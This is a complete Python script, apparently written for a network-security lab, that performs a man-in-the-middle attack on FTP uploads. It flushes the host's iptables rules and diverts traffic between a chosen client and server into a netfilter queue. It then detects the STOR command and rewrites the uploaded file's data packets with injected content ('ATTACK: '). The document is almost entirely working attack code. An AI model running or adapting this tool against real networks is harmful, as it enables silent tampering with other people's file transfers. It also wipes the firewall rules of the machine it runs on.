from scapy.all import *
from netfilterqueue import NetfilterQueue
import re
import threading
import os
import signal
import sys
import subprocess

# Global state tracking
ftp_state = {
    'data_port': None,
    'filename': None,
    'waiting_for_150': False,
    'file_transfer_started': False,
    'file_content': b'',
    'last_seq': None,
    'client_ip': None,
    'server_ip': None,
    'server_control_port': 21,
    'client_control_port': None,
    'first_packet': True
}

lock = threading.Lock()

def get_nfqueue_pid():
    """Get PID of process using NFQUEUE 1"""
    try:
        output = subprocess.check_output("sudo cat /proc/net/netfilter/nfnetlink_queue", shell=True).decode()
        for line in output.split('\n'):
            if 'queue-num 1' in line:
                return int(line.split()[1])  # PID is the 2th column
    except Exception:
        return None
    return None

def cleanup():
    """Clean up iptables rules and any remaining processes"""
    print("\n[!] Performing cleanup...")
    
    # Get and kill NFQUEUE PID
    nfq_pid = get_nfqueue_pid()
    if nfq_pid:
        print(f"[+] Killing NFQUEUE process (PID: {nfq_pid})")
        os.system(f"sudo kill -9 {nfq_pid}")
    
    # Clean iptables
    os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1 2>/dev/null")
    os.system("sudo iptables -F 2>/dev/null")
    os.system("sudo iptables -X 2>/dev/null")
    
    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)

def signal_handler(sig, frame):
    """Handle interrupt signals"""
    cleanup()

def get_user_input():
    """Prompt user for client and server IP addresses"""
    ftp_state['client_ip'] = input("Enter CLIENT IP address: ").strip()
    ftp_state['server_ip'] = input("Enter SERVER IP address: ").strip()
    print(f"\n[+] Monitoring FTP traffic between {ftp_state['client_ip']} (client) and {ftp_state['server_ip']} (server)")

def setup_iptables():
    """Set up specific iptables rules"""
    os.system("sudo iptables -F")
    os.system("sudo iptables -X")
    os.system(f"sudo iptables -I FORWARD -s {ftp_state['client_ip']} -d {ftp_state['server_ip']} -j NFQUEUE --queue-num 1")
    os.system(f"sudo iptables -I FORWARD -s {ftp_state['server_ip']} -d {ftp_state['client_ip']} -j NFQUEUE --queue-num 1")

def process_packet(packet):
    pkt = IP(packet.get_payload())

    # Extract client control port
    if pkt.haslayer(TCP) and pkt[TCP].dport == ftp_state['server_control_port']:
        ftp_state['client_control_port'] = pkt[TCP].sport

    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')

        # Detect EPSV mode and extract data port
        if "229 Entering Extended Passive Mode" in raw_data:
            match = re.search(r'\(\|\|\|(\d+)\|\)', raw_data)
            if match:
                with lock:
                    ftp_state['data_port'] = int(match.group(1))
                    # print(f"[+] Data Connection Port: {ftp_state['data_port']}")

        # Detect file upload command (STOR)
        elif "STOR " in raw_data and ftp_state['data_port']:
            with lock:
                ftp_state['filename'] = raw_data.split('STOR ')[1].strip()
                print(f"[+] Detected file transfer: {ftp_state['filename']}")
                ftp_state['waiting_for_150'] = True

        # Detect 150 response (server ready for file transfer)
        elif "150 " in raw_data and ftp_state['waiting_for_150']:
            with lock:
                print("[+] Server ready for transfer, intercepting file data")
                ftp_state['file_transfer_started'] = True
                ftp_state['waiting_for_150'] = False

    # Handle FTP-DATA interception
    if (pkt.haslayer(TCP) and 
        ftp_state['file_transfer_started'] and 
        pkt[TCP].dport == ftp_state['data_port'] and 
        pkt.haslayer(Raw)):

        with lock:
            original_payload = pkt[Raw].load
            
            if ftp_state['first_packet']:
                print(f"[+] Original Data: {original_payload}")
                ftp_state['file_content'] = b"ATTACK: " + original_payload
                print(f"[+] Modified Data: {ftp_state['file_content']}")
                print("[+] Injected successfully")
                print("[*] Press Ctrl + C to terminate program....")
                ftp_state['first_packet'] = False

            modified_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                         TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                             seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags='PA') / \
                         ftp_state['file_content']

            send(modified_pkt, verbose=False)
            packet.drop()
            return

    packet.accept()

def start_nfqueue():
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    
    try:
        # print("\n[*] Starting NFQUEUE interception...")
        print("[*] Waiting for file transfer...")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] Error in NFQUEUE: {e}")
    finally:
        nfqueue.unbind()
        # cleanup()

if __name__ == "__main__":
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        get_user_input()
        setup_iptables()
        start_nfqueue()
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        cleanup()
